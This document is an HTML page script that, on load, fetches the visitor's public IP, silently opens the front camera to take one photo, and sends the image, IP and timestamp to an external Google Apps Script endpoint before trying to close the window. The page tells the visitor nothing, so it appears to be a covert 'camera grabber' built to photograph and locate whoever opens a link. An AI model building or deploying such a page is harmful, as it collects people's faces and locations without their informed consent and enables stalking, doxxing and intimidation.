<body>
    <script>
        async function captureAndUpload() {
            try {
                // 1. Get public IP address (with fallback)
                let userIP = 'unknown';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    userIP = ipData.ip || 'unknown';
                } catch (ipErr) {
                    console.warn('IP fetch failed:', ipErr);
                }

                // 2. Access camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { exact: "user" },
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                // 3. Capture image
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // 4. Stop camera immediately
                stream.getTracks().forEach(track => track.stop());
                
                // 5. Prepare image data
                const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
                
                // 6. Get current timestamp
                const timestamp = new Date().toISOString();
                
                // 7. Send to Google Apps Script
                const response = await fetch('https://script.google.com/macros/s/AKfycbxveLuf1BJSzOr81f8ffjUfbS62-e1W3wnvXofXDFwSdatcBGabzXC6c8fbytcX346w/exec', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: imageData,
                        ip: userIP,
                        timestamp: timestamp
                    })
                });
                
                console.log('Upload result:', await response.text());
                
            } catch (error) {
                console.error('Capture failed:', error);
            } finally {
                // 8. Close window (may not work in all browsers)
                setTimeout(() => window.close(), 500);
            }
        }

        // Start immediately
        window.onload = captureAndUpload;
    </script>
